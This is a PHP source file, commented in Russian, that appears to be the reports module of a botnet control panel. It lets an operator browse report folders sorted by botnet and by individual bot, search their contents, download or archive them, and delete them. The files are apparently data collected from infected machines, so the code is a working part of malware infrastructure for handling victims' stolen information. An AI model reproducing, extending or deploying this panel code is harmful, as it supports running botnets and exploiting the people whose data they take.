<?php if(!defined('__CP__'))die();
define('COLUMNS_COUNT', 4); //Количетсво колонок в таблице файлов.

$_allow_remove = !empty($_USER_DATA['r_reports_files_edit']);

///////////////////////////////////////////////////////////////////////////////
// Определяем данные для фильтра.
///////////////////////////////////////////////////////////////////////////////

$_FILTER['path']    = isset($_GET['path']) ? $_GET['path'] : '';

$_FILTER['bots']    = isset($_GET['bots'])    ? $_GET['bots'] : '';
$_FILTER['botnets'] = isset($_GET['botnets']) ? $_GET['botnets'] : '';

$_FILTER['mask']    = isset($_GET['mask']) ? $_GET['mask'] : '';
$_FILTER['q']       = isset($_GET['q'])    ? $_GET['q'] : '';
$_FILTER['cs']      = empty($_GET['cs'])   ? 0 : 1;
//В текущей папке мы можем искать только когда не указаны bots и botnets.
$_FILTER['cd']      = (empty($_GET['cd']) || $_FILTER['bots'] != '' || $_FILTER['botnets'] != '')  ? 0 : 1;

$_is_browser = !isset($_GET['q']); //Режим браузера/поиска

///////////////////////////////////////////////////////////////////////////////
// Обрабатываем $_FILTER['path'].
///////////////////////////////////////////////////////////////////////////////

//ИМХО: Т.к. переменная path автоматическая, и не как не должна изменяться пользователем, исправление ошибок не производиться.
//Здесь конечно мы не защищены от вмешательсва в http-запрос. Нех вмешиваться.

if(isset($_GET['sub']) && strlen($_GET['sub']) > 0)$_FILTER['path'] .= ($_FILTER['path'] == '' ? '' : '/').$_GET['sub'];
if(PathUpLevelExists($_FILTER['path']))die('WOW!');
$_CUR_PATH = $_FILTER['path'] == '' ? REPORTS_PATH : REPORTS_PATH.'/'.$_FILTER['path'];

///////////////////////////////////////////////////////////////////////////////
// Загрузка файла.
///////////////////////////////////////////////////////////////////////////////

if(isset($_GET['file']))
{
  if(PathUpLevelExists($_GET['file']))die('SUPER WOW!');
  $fl = $_CUR_PATH.'/'.$_GET['file'];
  if(!@file_exists($fl) || !@is_file($fl))ThemeFatalError('File not exists.');
  
  HTTPDownloadHeaders(urldecode(basename_ex($_GET['file'])), @filesize($fl));
  echo @file_get_contents($fl);
  die();
}

///////////////////////////////////////////////////////////////////////////////
// Создание архива/Удаление файлов.
///////////////////////////////////////////////////////////////////////////////

if(isset($_POST['filesaction']) && is_numeric($_POST['filesaction']) && !empty($_POST['files']) && is_array($_POST['files']))
{
  foreach($_POST['files'] as $file)if(PathUpLevelExists($file))die('PUPER WOW!');
  
  //Удаление файлов.
  if($_POST['filesaction'] == 0 && $_allow_remove)
  {
    $_errors = array();
    foreach($_POST['files'] as $file)if(strlen($file) > 0)ClearDF($_CUR_PATH.'/'.$file, $_errors);
  }
  //Создание архива.
  else if($_POST['filesaction'] == 1)
  {
    $list = array();
    foreach($_POST['files'] as $file)$list[] = $_CUR_PATH.'/'.$file;
    
    if(($arcfile = CreateTempFile('arc')) === false)die('Failed to create temp file.');
    @unlink($arcfile);
    
    require_once('fsarc.php');
    if(!function_exists('arc_Create') || ($arcfile = arc_Create($arcfile, $list)) === false)die('Failed to create archive, please check "system/fsarc.php" script.');
    
    HTTPDownloadHeaders(basename_ex($arcfile), @filesize($arcfile));
    echo @file_get_contents($arcfile);
    @unlink($arcfile);
    die();
  }
}

///////////////////////////////////////////////////////////////////////////////
// Вывод.
///////////////////////////////////////////////////////////////////////////////

if(isset($_GET['search']))
{
  echo
  str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="CheckAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_REPORTS_LIST_NAME,  'auto'), THEME_LIST_HEADER_L).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_REPORTS_LIST_SIZE,  'auto'), THEME_LIST_HEADER_R).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_REPORTS_LIST_MTIME, 'auto'), THEME_LIST_HEADER_L).
    THEME_LIST_ROW_END;
  
  $ci = 0;
  $counter = array(0, 0, 0);
  $lastfolder = 0;
  
  if($_FILTER['bots'] != '' || $_FILTER['botnets'] != '')
  {
    //!При таком способе обзора, алгоритм получается требовательным к памяти, но кажеться сколнен к быстродейтствию. Время покажет.
    
    //Получаем корневые папки.
    $root = GetAllDirs(REPORTS_PATH, $ci);
    foreach($root as $rdir)
    {
      $tr = REPORTS_PATH.'/'.$rdir;
      
      //Получаем список ботнетов.
      $botnets = GetAllDirs($tr, $ci);
      foreach($botnets as $bn)if($_FILTER['botnets'] == '' || MatchStringInExpString(urldecode($bn), $_FILTER['botnets'], 0, 1))
      {
        $tb = $tr.'/'.$bn;
        
        //Получаем список ботов.
        $bots = GetAllDirs($tb, $ci);
        foreach($bots as $b)if($_FILTER['bots'] == '' || MatchStringInExpString(urldecode($b), $_FILTER['bots'], 0, 1))SearchDF($tb.'/'.$b, $rdir.'/'.$bn.'/'.$b, $ci, $counter, $lastfolder);
        unset($bots);
      }
      unset($botnets);
    }
    unset($root);
  }
  else
  {
    if($_FILTER['cd'])SearchDF($_CUR_PATH, $_FILTER['path'], $ci, $counter, $lastfolder);
    else SearchDF(REPORTS_PATH, '', $ci, $counter, $lastfolder);
  }
  
  echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'),
                   array(COLUMNS_COUNT, sprintf(LNG_REPORTS_LIST_TOTAL, number_format_as_int($counter[1]), number_format_as_int($counter[2]), number_format_as_int($counter[0]))),
                   THEME_LIST_TITLE).THEME_LIST_END; 
}
else
{
  define('INPUT_WIDTH',  '200px'); //Ширина input.text.
  define('INPUTQ_WIDTH', '500px'); //Ширина input.text.

  //Создаем JS-скрипт.
  $fl_onsubmit  = ' onsubmit="return ExecuteAction()"';
  $js_qa     = addjsslashes(LNG_REPORTS_FILESACTION_Q);
  $js_script = JSCheckAll('fileslist', 'checkall', 'files[]').
               "function ExecuteAction(){return confirm('{$js_qa}');}";

  if($_is_browser)
  {
    $query = addjsslashes(QUERY_STRING.'&path='.urlencode($_FILTER['path']));
    $js_script .= JSSetSortMode($query);
  }
  else
  {
    $q = addjsslashes(QUERY_STRING);
    foreach($_FILTER as $k => $v)$q .= addjsslashes('&'.urlencode($k).'='.urlencode($v));
    
    $ajax_init = JSXMLHttpRequest('srhhttp');
    $ajax_err  = addjsslashes(str_replace('{TEXT}', LNG_REPORTS_RESULT_ERROR, THEME_STRING_ERROR));
    
    $js_script .=
<<<JS_SCRIPT

var srhhttp = false;

function StateChange(){if(srhhttp.readyState == 4)
{
  var el = document.getElementById('result');
  if(srhhttp.status == 200 && srhhttp.responseText.length > 1)el.innerHTML = srhhttp.responseText;
  else el.innerHTML = '{$ajax_err}';
}}

function SearchFiles()
{
  {$ajax_init}
  if(srhhttp)
  {
    srhhttp.onreadystatechange = function(){StateChange()};
    srhhttp.open('GET', '{$q}&search=1', true);
    srhhttp.send(null);
  }
}
JS_SCRIPT;
  }  

  ThemeBegin(LNG_REPORTS, $js_script, $_is_browser ? 0 : GetBotJSMenu('botmenu'), $_is_browser ? 0 : ' onload="SearchFiles(0, 0)"');
  
  //Фильтр.
  echo 
  str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('filter', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_BEGIN).
    FORM_CURRENT_MODULE.
    str_replace(array('{NAME}', '{VALUE}'), array('path', htmlentities_ex($_FILTER['path'])), THEME_FORM_VALUE).
    str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_REPORTS_FILTER_TITLE), THEME_DIALOG_TITLE).
    
      //Стандартный фильтр.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'bots',      htmlentities_ex($_FILTER['bots']),      512), THEME_DIALOG_ITEM_INPUT_TEXT).
            THEME_DIALOG_ITEM_MAXSPACE.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_BOTNETS, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUT_WIDTH, 'botnets',   htmlentities_ex($_FILTER['botnets']),   512), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //Строка поиска.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_GROUP_BEGIN).
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_MASK, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUTQ_WIDTH, 'mask', htmlentities_ex($_FILTER['mask']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace('{TEXT}', LNG_REPORTS_FILTER_QUERY, THEME_DIALOG_ITEM_TEXT).
            str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array(INPUTQ_WIDTH, 'q', htmlentities_ex($_FILTER['q']), 4096), THEME_DIALOG_ITEM_INPUT_TEXT).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'), array(2, 'cs', 1, LNG_REPORTS_FILTER_CS, ''), $_FILTER['cs'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
          THEME_DIALOG_ROW_BEGIN.
            str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{TEXT}', '{JS_EVENTS}'), array(2, 'cd', 1, LNG_REPORTS_FILTER_CURDIR, ''), $_FILTER['cd'] ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
          THEME_DIALOG_ROW_END.
        THEME_DIALOG_GROUP_END.
      THEME_DIALOG_ROW_END.
    
      //Управление.
      str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ACTIONLIST_BEGIN).
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_RESET, ''), THEME_DIALOG_ITEM_ACTION_RESET).
        '&#160;'.
        str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_FILTER_SUBMIT, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
      THEME_DIALOG_ACTIONLIST_END.
    THEME_DIALOG_END.
  THEME_FORMGET_END.
  THEME_VSPACE;

  //Вывод ошибок.
  if(!empty($_errors))
  {
    $i = 0;
    echo str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN);
    foreach($_errors as $e)
    {
      echo
      THEME_LIST_ROW_BEGIN.
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', str_replace('{TEXT}', $e, THEME_STRING_ERROR)), ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1)).
      THEME_LIST_ROW_END;
      $i++;
    }
    echo THEME_LIST_END.THEME_VSPACE;
  }

  //Список дейтсвий.
  $al = LNG_REPORTS_FILESACTION.'&#160;'.str_replace(array('{NAME}', '{WIDTH}'), array('filesaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN);
  if($_allow_remove)$al .= str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_REPORTS_FILESACTION_REMOVE), THEME_DIALOG_ITEM_LISTBOX_ITEM);
  $al .= str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_REPORTS_FILESACTION_CREATEARC), THEME_DIALOG_ITEM_LISTBOX_ITEM).
         THEME_DIALOG_ITEM_LISTBOX_END.
         '&#160;'.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;

  //Обзор.
  if($_is_browser)
  {
    //Определяем данные текущей сортировки.
    $_uri_sortmode_html = htmlentities_ex(AssocateSortMode(array(0, 1, 2)));
    
    echo
    str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('fileslist', QUERY_STRING_HTML.'&amp;path='.htmlentities_ex(urlencode($_FILTER['path'])).$_uri_sortmode_html, $fl_onsubmit), THEME_FORMPOST_BEGIN).
      str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS_RESULT_BROWSE), THEME_DIALOG_TITLE).
        THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
          str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
            str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, LNG_REPORTS_LIST_DIR_TITLE.' '.htmlentities_ex('/'.urldecode($_FILTER['path']))), THEME_LIST_TITLE).
            THEME_LIST_ROW_BEGIN.
              str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="CheckAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1).
              WriteSortColumn(LNG_REPORTS_LIST_NAME,  0, 0).
              WriteSortColumn(LNG_REPORTS_LIST_SIZE,  1, 0).
              WriteSortColumn(LNG_REPORTS_LIST_MTIME, 2, 1).
            THEME_LIST_ROW_END;  
    
    //Определяем URL'ы.
    $up = dirname($_FILTER['path']);
    if(strcmp($up, '.') === 0 || strcmp($up, '/') === 0 || strcmp($up, '\\') === 0)$up = '';
      
    $_url_download = QUERY_STRING_HTML.'&amp;path='.htmlentities_ex(urlencode($_FILTER['path'])).'&amp;file=';
    $_url_subdir   = QUERY_STRING_HTML.'&amp;path='.htmlentities_ex(urlencode($_FILTER['path'])).$_uri_sortmode_html.'&amp;sub=';
    $_url_updir    = QUERY_STRING_HTML.'&amp;path='.htmlentities_ex(urlencode($up)).$_uri_sortmode_html;
      
    //Читаем каталог. К сожелению алгоритм очень медленный...
    $files = array();
    $dirs  = array();
    $size  = 0;
    $msg   = '';
  
    if(($dr = @opendir($_CUR_PATH)) === false)$msg = LNG_REPORTS_RESULT_ERRORDIR;
    else
    {
      //Читаем каталог.
      while(($fl = @readdir($dr)) !== false)if(strcmp($fl, '..') !== 0 && strcmp($fl, '.') !== 0)
      {
        $cur = $_CUR_PATH.'/'.$fl;
        if(($mtime = @filemtime($cur)) === false)$mtime = 0;
     
        if(is_dir($cur))$dirs[] = array($fl, 0, $mtime);
        else
        {
          if(($sz = @filesize($cur)) === false)$sz = 0;
          $size += $sz;
          $files[] = array($fl, $sz >= 0 ? $sz : -1, $mtime);
        }
      }
    
      @closedir($dr);
    
      usort($files, 'sort_proc');
      usort($dirs,  'sort_proc');
    }
  
    $c = 0;
      
    //Добавляем уровень вверх.
    if($_FILTER['path'] != '')echo ListElement($c, 0, str_replace(array('{URL}', '{TEXT}'), array($_url_updir, htmlentities_ex('[..]')), THEME_LIST_ANCHOR), LNG_REPORTS_LIST_UP, @filemtime($_CUR_PATH));
      
    if($msg != '')                                             echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, $msg), THEME_LIST_ITEM_EMPTY_1);
    else if(count($files) == 0 && count($dirs) == 0 && $c == 0)echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, LNG_REPORTS_RESULT_EMPTYDIR), THEME_LIST_ITEM_EMPTY_1);
    else
    {
      //Вывод директорий.
      foreach($dirs as $fl)
      {
        $a = str_replace(array('{URL}', '{TEXT}'), array($_url_subdir.htmlentities_ex(urlencode($fl[0])), htmlentities_ex('['.urldecode($fl[0]).']')), THEME_LIST_ANCHOR);
        echo ListElement($c, $fl[0], $a, LNG_REPORTS_LIST_DIR, $fl[2]);
      }

      //Вывод файлов.
      foreach($files as $fl)
      {
        $a = str_replace(array('{URL}', '{TEXT}'), array($_url_download.htmlentities_ex(urlencode($fl[0])), htmlentities_ex(urldecode($fl[0]))), THEME_LIST_ANCHOR);
        echo ListElement($c, $fl[0], $a, $fl[1], $fl[2]);
      }
      
      echo
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'),
                  array(COLUMNS_COUNT, sprintf(LNG_REPORTS_LIST_TOTAL, number_format_as_int(count($files)), number_format_as_int($size), number_format_as_int(count($dirs)))),
                  THEME_LIST_TITLE);
    }
    
    echo THEME_LIST_END.THEME_DIALOG_ITEM_CHILD_END.THEME_DIALOG_ROW_END.THEME_DIALOG_END.THEME_FORMPOST_END;
  }
  //Результат поиска.
  else
  {
    //Результат.
    echo
    str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('fileslist', QUERY_STRING_HTML, $fl_onsubmit), THEME_FORMPOST_BEGIN).
      str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS_RESULT), THEME_DIALOG_TITLE).
        THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace('{ID}', 'result', THEME_STRING_ID_BEGIN).
              THEME_IMG_WAIT.
            THEME_STRING_ID_END.
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_END.
    THEME_FORMPOST_END;
  }
  
  ThemeEnd();
}

die();


///////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////

/*
  Алгоритм сортровки по имени/размеру/дате.
  см. usort. 
*/
function sort_proc($a, $b)
{
  global $_SORT_ORDER, $_SORT_COLUMN_ID;
  
  $r = 0;
  if($_SORT_COLUMN_ID == 0)     $r = strcasecmp($a[0], $b[0]);
  else if($_SORT_COLUMN_ID == 1)$r = ($a[1] > $b[1] ? 1 : ($a[1] < $b[1] ? -1 : 0)); //FIXME: Неправильная сортировка для файлов более 2Гб.
  else if($_SORT_COLUMN_ID == 2)$r = ($a[2] > $b[2] ? 1 : ($a[2] < $b[2] ? -1 : 0));
  
  if($r == 0 && $_SORT_COLUMN_ID != 0)$r = strcasecmp($a[0], $b[0]);
  
  return ($_SORT_ORDER == 0 || $r == 0 ? $r : (-$r));
}

/*
  Удаление файлов и папок.
  
  IN $path         - string, полный путь.
  IN OUT $badfiles - array, список элементов, котрые не удалось удалить.
*/
function ClearDF($path, &$badfiles)
{
  @chmod($path, 0777);
  
  if(is_dir($path))
  {
    if(($dh = @opendir($path)) !== false)
    {
      while(($file = readdir($dh)) !== false)if(strcmp($file, '.') !== 0 && strcmp($file, '..') !== 0)ClearDF($path.'/'.$file, $badfiles);
      @closedir($dh);
    }
    if(!@rmdir($path) && @file_exists($path))$badfiles[] = sprintf(LNG_REPORTS_FILESACTION_REMOVE_EDIR, htmlentities_ex($path));
  }
  else if(is_file($path))
  {
    if(!@unlink($path) && @file_exists($path))$badfiles[] = sprintf(LNG_REPORTS_FILESACTION_REMOVE_EFILE, htmlentities_ex($path));
  }
}

/*
  Поиск файлов и папок.
  
  IN $path           - string, полный путь в котором осушетвляется поиск.
  IN $upath          - string, путь отображаемый для пользователя.
  IN OUT $ci         - int, счетчик элемента.
  IN OUT $counter    - array, счетчики папок и файлов.
  IN OUT $lastfolder - string, последняя директория которая являлось родителем для найденого элемента.
*/
function SearchDF($path, $upath, &$ci, &$counter, &$lastfolder)
{
  global $_FILTER;

  if(($dh = @opendir($path)) === false)echo ListElement($ci, 0, str_replace('{TEXT}', sprintf(LNG_REPORTS_RESULT_SEDIR, htmlentities_ex($path)), THEME_STRING_ERROR), -1, 0);
  else 
  {
    $subdirs = array(); 
    
    //Работаем на скорость. Есть повторяющиеся фрагменты!
    while(($file = readdir($dh)) !== false)if(strcmp($file, '.') !== 0 && strcmp($file, '..') !== 0)
    {
      $npath  = $path.'/'.$file;
      $nupath = ($upath == '' ? '' : $upath.'/').$file;
      
      if(is_dir($npath))
      {
        $subdirs[] = array($npath, $nupath);
        
        if($_FILTER['q'] == '' && MatchStringInExpString(($rname = urldecode(($file))), $_FILTER['mask'], 0, 1))
        {
          if(strcasecmp($lastfolder, $upath) !== 0){$ci = 0; $lastfolder = $upath; TitleAsPathNavigator($upath);}
          $a = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;path='.htmlentities_ex(urlencode($upath)).'&amp;sub='.htmlentities_ex(urlencode($file)), htmlentities_ex('['.$rname.']')), THEME_LIST_ANCHOR);
          echo ListElement($ci, $nupath, $a, LNG_REPORTS_LIST_DIR, @filemtime($npath));
          $counter[0]++;
        }
      }
      else if(is_file($npath) && MatchStringInExpString(($rname = urldecode($file)), $_FILTER['mask'], 0, 1) && ($_FILTER['q'] == '' || SearchString($_FILTER['q'], $_FILTER['cs'], $npath, $ci)))
      {
        if(strcasecmp($lastfolder, $upath) !== 0){$ci = 0; $lastfolder = $upath; TitleAsPathNavigator($upath);}
        $a = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;path='.htmlentities_ex(urlencode($upath)).'&amp;file='.htmlentities_ex(urlencode($file)), htmlentities_ex($rname)), THEME_LIST_ANCHOR);
        
        echo ListElement($ci, $nupath, $a, ($sz = @filesize($npath)), @filemtime($npath));
        $counter[1] ++;
        $counter[2] += $sz;
      }
    }
      
    @closedir($dh);
    
    foreach($subdirs as $sd)SearchDF($sd[0], $sd[1], $ci, $counter, $lastfolder);
  }
}

/*
  Вывод THEME_LIST_TITLE с навигацией по папкам.
  
  IN $path - string, путь для обработки.
*/
function TitleAsPathNavigator($path)
{
  $_url_subdir = QUERY_STRING_HTML.'&amp;path=&amp;sub=';
  $str = '';
  $list = explode('/', str_replace('\\', '/', $path));
  $p = '';
  $i = 0;
  foreach($list as $k)
  {
    if($i++ == 2)$str .= '/'.BotPopupMenu(urldecode($k), 'botmenu');
    else $str .= '/'.str_replace(array('{URL}', '{TEXT}'), array($_url_subdir.htmlentities_ex(urlencode($p.$k)), htmlentities_ex(urldecode($k))), THEME_LIST_ANCHOR);
    
    $p .= $k.'/';
  }
  
  echo str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(COLUMNS_COUNT, $str == '' ? '/' : $str), THEME_LIST_TITLE);
}

/*
  Поиск utf-8 строки в файле.
  
  IN $str     - string, строка для поиска.
  IN $cs      - int, > 0 - поиск с учетом регистра.
  IN $file    - string, файл в котором производися поиск.
  IN OUT $ci  - int, счетчик элемента.
  
  Return      - true - строка найдена,
                false - строка не найдена.
*/
function SearchString($str, $cs, $file, &$ci)
{
  $len      = strlen($str);
  $len_b    = -($len - 1);
  $buf_size = max(1 * 1024 * 1024, $len);

  if(($f = @fopen($file, 'rb')) === false)
  {
    echo ListElement($ci, 0, str_replace('{TEXT}', sprintf(LNG_REPORTS_RESULT_SEFILE, htmlentities_ex($file)), THEME_STRING_ERROR), -1, 0);
    return false;
  }

  //Работаем на скорость.
  if($cs)
  {
    do if(@mb_strpos(@fread($f, $buf_size), $str) !== false)
    {
      @fclose($f);
      return true;
    }
    while(!@feof($f) && @fseek($f, $len_b, SEEK_CUR) === 0);
  }
  else
  {
    $str = @mb_strtolower($str);
    do if(@mb_strpos(@mb_strtolower(@fread($f, $buf_size)), $str) !== false)
    {
      @fclose($f);
      return true;
    }
    while(!@feof($f) && @fseek($f, $len_b, SEEK_CUR) === 0);
  }

  @fclose($f);
  return false;
}

/*
  Получение списка всех директорий.
  
  IN $path   - string, путь для поиска.
  IN OUT $ci - int, счетчик элемента.
  
  Return     - array, список диреторий.
*/
function GetAllDirs($path, &$ci)
{
  $r = getdirs($path);
  if($r === false)
  {
    echo ListElement($ci, 0, str_replace('{TEXT}', sprintf(LNG_REPORTS_RESULT_SEDIR, htmlentities_ex($path)), THEME_STRING_ERROR), -1, 0);
    $r = array();
  }
  return $r;
}

/*
  Создание элемента для списока.
  
  IN OUT $ci  - int, счетчик элемента.
  IN $pd_name - string, данные для POST['files'] (без обработки htmlentities_ex), или 0.
  IN $text    - текст элемента.
  IN $size    - int/string, размер элемента в байтах, или -1, или строка (с оброботкой htmlentities_ex).
  IN $mtime   - int, время модификации элемента, или 0.
  
  Retrurn     - string, элемент.
*/
function ListElement(&$ci, $pd_name, $text, $size, $mtime)
{
  $theme = $ci % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1;
  $ci++;
  
  return
  THEME_LIST_ROW_BEGIN.
    (
      $pd_name === 0 ?
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', '&#160;'),                                            $theme) :
      str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('files[]', htmlentities_ex($pd_name), ''),     $ci % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2)
    ).
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $text),                                                 $theme).
    str_replace(array('{WIDTH}', '{TEXT}'),
                array('auto', is_numeric($size) ? ($size >= 0 ? number_format_as_int($size) : '&#160;') : $size),  $ci % 2 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2).
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $mtime == 0 ? '&#160;' : htmlentities_ex(gmdate(LNG_FORMAT_DT, $mtime))), $ci % 2 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2).
  THEME_LIST_ROW_END;
}
?>